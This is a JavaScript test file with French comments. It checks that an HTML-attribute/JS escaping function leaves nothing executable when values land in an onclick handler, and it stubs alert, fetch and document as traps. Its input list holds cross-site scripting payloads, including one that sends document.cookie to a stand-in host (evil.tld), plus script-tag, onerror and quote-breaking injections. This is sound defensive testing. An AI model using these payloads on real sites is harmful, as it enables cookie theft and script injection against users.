/* Vérifie l'invariant de escAttrJs() : quelle que soit la valeur d'entrée, la
   valeur reçue par le gestionnaire onclick est identique à l'originale, et
   rien ne s'exécute en plus.

   On rejoue la chaîne réelle du navigateur :
     1. le template littéral produit  onclick="fn('<échappé>')"
     2. le parseur HTML décode les entités de l'attribut
     3. le moteur JS évalue le contenu de l'attribut

   Lancement : node tests/escaping.test.mjs
*/
import { readFileSync } from 'node:fs';
import { strict as assert } from 'node:assert';

const src = readFileSync(new URL('../app/static/app.js', import.meta.url), 'utf8');
const match = src.match(/function escAttrJs\(s\) \{[\s\S]*?\n\}/);
assert.ok(match, 'escAttrJs() introuvable dans app/static/app.js');
const escAttrJs = new Function(`${match[0]}; return escAttrJs;`)();

/* Décodage d'entités tel que le fait le parseur HTML sur une valeur d'attribut. */
function htmlAttrDecode(s) {
  return s
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, '&');
}

/* Antislash, CR et LF construits par code : les ecrire en litteral les
   expose aux couches d'echappement successives des outils. */
const BS = String.fromCharCode(92);
const CR = String.fromCharCode(13);
const LF = String.fromCharCode(10);
const NASTY = [
  'Chromecast',
  'iPhone de Leo',
  "O'Brien",
  '"; alert(1); //',
  "'); alert(1); //",
  "');fetch('http://evil.tld?c='+document.cookie);//",
  '&#39;); alert(1); //',
  '&amp;',
  '</script><script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'back' + BS + 'slash',
  'double' + BS + BS + 'slash',
  "quote\"and'both",
  'saut' + LF + 'de' + LF + 'ligne',
  'retour' + CR + 'chariot',
  BS + "' ); alert(1); //",
  BS + BS + "' ); alert(1); //",
  '',
  null,
  undefined,
];

let executed = 0;
let checked = 0;

for (const input of NASTY) {
  const attr = `fn('${escAttrJs(input)}')`;   // 1. ce qui part dans le HTML
  const code = htmlAttrDecode(attr);          // 2. ce que le parseur HTML donne à JS

  let received;
  const fn = (v) => { received = v; };
  const boom = () => { executed++; };

  // 3. évaluation, avec des pièges branchés sur les charges utiles courantes
  new Function('fn', 'alert', 'fetch', 'document', code)(
    fn, boom, boom, { cookie: 'secret' },
  );

  const expected = String(input ?? '');
  assert.equal(received, expected,
    `valeur alterée\n  entrée   : ${JSON.stringify(input)}\n  attendu  : ${JSON.stringify(expected)}\n  reçu     : ${JSON.stringify(received)}\n  attribut : ${attr}`);
  checked++;
}

assert.equal(executed, 0, `${executed} charge(s) utile(s) exécutée(s) — échappement insuffisant`);
console.log(`ok — ${checked} valeurs échappées sans altération, 0 exécution parasite`);
